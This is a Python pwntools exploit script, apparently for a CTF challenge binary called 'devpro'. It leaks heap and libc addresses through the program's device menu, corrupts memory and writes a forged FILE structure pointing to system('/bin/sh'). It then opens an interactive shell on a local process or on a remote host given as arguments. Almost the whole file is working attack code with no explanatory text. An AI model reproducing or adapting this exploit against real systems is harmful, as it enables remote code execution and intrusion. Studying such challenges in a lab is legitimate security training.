#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./devpro', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
#gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))
#context.terminal = ['tmux', 'new-window']
#debug = lambda : gdb.attach(r) #, gdbscript='b *{:#x}'.format(code.address+0x10EE))
binsh = lambda : next(libc.search('/bin/sh'))
uu64 = lambda x: u64(x.ljust(8, '\0'))

def open_dev(idx):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(idx))

def add(size):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(size))

def read_dev():
    r.sendlineafter('> ', '3')
    tmp = r.recvuntil('\n[+] OK', drop=True)
    return tmp.replace(' ', '').decode('hex')

def write_dev(s):
    r.sendlineafter('> ', '4')
    r.recvuntil(': ')
    for i in s:
        r.sendline('%02x' % u8(i))

    r.sendline('-')

def close_dev():
    r.sendlineafter('> ', '5')

def exploit(r):
    add(0x400)
    open_dev(2)
    add(0x500)
    tmp = read_dev()
    print hexdump(tmp)

    bufptr = u64(tmp[0x420:0x428])
    info('%#x bufptr', bufptr)
    libc.address = u64(tmp[0x478:0x480]) - libc.sym['_IO_2_1_stderr_']
    info('%#x libc.address', libc.address)

    close_dev()
    open_dev(3)
    add(0x448+1)

    read_dev()
    write_dev('\x00'*0x22)

    add(0x500)

    r.sendlineafter('> ', '3')

    fakefile = fit({
        8: bufptr-0x733+0x2a0+0x100,
        0x10: bufptr-0x733+0x2a0+0x200,
        0x18: p64(1),
        0x20: 0,
        0x28: p64(1),
        0x30: p64(0),
        0x38: p64(libc.sym['system']),
        0x48: p64(binsh()),
        #0x48: bufptr-0x733+0x2a0,
        0x50: 1,
        0xd8: p64(libc.address + 0x2163c0+0x20),
        0x88: bufptr-0x733+0x2a0+0x300,
        0xe0: bufptr-0x83,
    }, filler='\0')
    r.sendline('\0'*0x410 + fakefile)

    r.sendlineafter('> ', '6')

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    elif len(sys.argv) > 1:
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = ELF('/dbg64/libc-amd64.so', checksec=False)
    else:
        #r = remote('127.0.0.1', 4444)
        r = code.process()
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    print code, libc
    exploit(r)
